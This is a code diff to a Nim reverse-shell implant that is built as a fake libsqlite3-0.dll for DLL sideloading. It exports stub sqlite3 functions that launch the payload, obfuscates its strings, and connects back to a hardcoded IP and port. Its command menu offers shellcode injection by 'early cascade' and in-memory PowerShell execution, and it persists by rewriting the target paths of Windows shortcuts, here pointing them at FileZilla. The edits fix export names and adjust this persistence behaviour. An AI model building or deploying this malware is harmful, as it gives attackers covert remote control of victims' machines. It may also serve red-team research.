@@ -35,15 +35,15 @@ import winim/clr except `[]`
 
 proc NimMain() {.cdecl, importc.}
 
-# nim c --app:lib -d:strip --passL:"libsqlite3-0.def" --nomain --cc:gcc --passL:-static --out:libsqlite3-0.dll revshell_sqlite3_t1.nim
+# nim c --app:lib -d:strip -d:release --passL:"-def:libsqlite3-0.def" --nomain --cc:gcc --passL:-static --out:libsqlite3-0.dll revshell_sqlite3_t1.nim
 
-#[ [ Edit this ] ]#
+#[ EDIT ]#
 let
-  portStr: string = jam("8000")
-  ipAddr: string = jam("172.16.0.4")
-  key: string = jam("test") # rc4 key for sc
-  mutexName: string = jam("Global\\qwerty123")
-  revShellPath: string = getAppFilename()
+  portStr = jam("8000")
+  ipAddr = jam("172.16.0.4")
+  key = jam("test") # rc4 key for sc
+  mutexName = jam("Global\\qwerty123")
+  programPath = jam("C:\\Program Files\\FileZilla FTP Client\\filezilla.exe")
 
 const 
   AF_INET = 2
@@ -144,14 +144,12 @@ proc sqlite3_main_routine() =
 
   var wsaData: WSAData
   if WSAStartup(0x0202, addr wsaData) != 0:
-    modifyAllLnkPaths(revShellPath)
     CloseHandle(hMutex)
     return
 
   var sock: SOCKET = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
   if sock == INVALID_SOCKET:
     discard WSACleanup()
-    modifyAllLnkPaths(revShellPath)
     CloseHandle(hMutex)
     return
 
@@ -166,7 +164,6 @@ proc sqlite3_main_routine() =
   if connect(sock, cast[PSOCKADDR](addr serverAddr), sizeof(serverAddr).cint) == SOCKETERROR:
     discard closesocket(sock)
     discard WSACleanup()
-    modifyAllLnkPaths(revShellPath)
     CloseHandle(hMutex)
     return
 
@@ -177,12 +174,12 @@ proc sqlite3_main_routine() =
 
   let menuStrs: array[8, string] = [
     jam("\n----------------------------------------------------------------------------------\n"),
-    jam("[!] Type 'exit' to exit and stop the process without resetting target paths on shortcuts.\n"),
-    jam("[!] Type 'exit_persist' to exit and set the target paths back to this binary.\n"),
+    jam("[!] Type 'exit' normal exit.\n"),
+    jam("[!] Type 'exit_persist' to exit and set the target paths on shortcuts to the target program.\n"),
     jam("----------------------------------------------------------------------------------\n\n"),
-    jam("[>] Type 'inject [bin path] [shellcode]' for early cascade injection.\n"),
-    jam("[>] Type 'pwsh [commands]' to execute powershell via System.Management.Automation.\n"),
-    jam("[>] Built in commands: cd, dir, type"),
+    jam("[>] Type 'inject <contents of the .txt file produced by converter.exe>' for early cascade injection.\n"),
+    jam("[>] Type 'pwsh <commands>' to execute powershell via System.Management.Automation.\n"),
+    jam("[>] Built in commands: cd, dir, type\n"),
     jam("[>] Type '?' to print this message again.\n\n")
   ]
 
@@ -316,7 +313,7 @@ proc sqlite3_main_routine() =
       elif cmd.strip().startsWith(exitP):
         discard closesocket(sock)
         discard WSACleanup()
-        modifyAllLnkPaths(revShellPath)
+        modifyAllLnkPaths(programPath)
         CloseHandle(hMutex)
         return 
 
@@ -393,7 +390,7 @@ proc `sqlite3_bind_double`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: L
   NimMain()
   return true 
 
-proc `sqlite3_bin_int`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
+proc `sqlite3_bind_int`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
   NimMain()
   return true 
 
@@ -513,7 +510,7 @@ proc `sqlite3_column_bytes`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: 
   NimMain()
   return true 
 
-proc `sqlite3_column_byte16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
+proc `sqlite3_column_bytes16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
   NimMain()
   return true 
 
@@ -1061,7 +1058,7 @@ proc `sqlite3_set_auxdata`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: L
   NimMain()
   return true
 
-proc `sqlite3_set_last_insert_rowid`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
+proc `sqlite3_last_insert_rowid`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
   NimMain()
   return true 
 
